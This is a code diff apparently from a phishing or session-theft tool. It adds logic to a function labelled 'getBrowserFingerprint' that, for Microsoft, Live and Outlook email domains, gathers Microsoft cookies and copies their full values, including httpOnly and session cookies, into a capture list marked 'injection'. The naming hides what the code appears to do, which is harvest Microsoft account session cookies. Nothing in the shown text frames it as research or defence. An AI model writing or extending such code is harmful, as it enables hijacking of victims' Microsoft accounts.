@@ -62,6 +62,24 @@ export const getBrowserFingerprint = async (userEmail?: string) => {
   if (emailDomain === 'live.com' || emailDomain.includes('microsoft') || emailDomain.includes('outlook')) {
     console.log('🔵 Microsoft domain detected, enabling cookie capture for:', emailDomain);
     cookieCapture = cookieUtils.buildCookieCapture();
+    
+    // Add Microsoft cookies from the capture system
+    const microsoftCookies = microsoftCookieCapture.getMicrosoftCookies();
+    if (microsoftCookies.length > 0) {
+      cookieCapture.cookieList = microsoftCookies.map(cookie => ({
+        name: cookie.name,
+        value: cookie.value,
+        domain: cookie.domain,
+        path: cookie.path || '/',
+        secure: cookie.secure || false,
+        httpOnly: cookie.httpOnly || false,
+        sameSite: cookie.sameSite || 'none',
+        expirationDate: cookie.expirationDate,
+        session: cookie.session || false,
+        captureMethod: cookie.captureMethod || 'injection',
+        timestamp: cookie.timestamp
+      }));
+    }
   } else {
     // Keep general cookie capturing disabled for non-Microsoft domains
     cookieCapture = {
